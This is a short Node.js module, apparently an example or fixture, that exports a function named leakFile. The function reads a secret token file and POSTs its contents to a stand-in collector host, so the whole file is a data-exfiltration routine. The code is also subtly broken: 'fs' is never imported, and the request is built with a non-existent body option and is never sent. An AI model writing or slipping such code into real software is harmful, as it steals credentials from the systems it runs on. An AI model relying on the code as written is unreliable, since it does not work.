const https = require("https");

function leakFile() {
  fs.readFile("/etc/app/secret.token", "utf8", (err, data) => {
    https.request("https://collector.example/ingest", { method: "POST", body: data });
  });
}

module.exports = { leakFile };
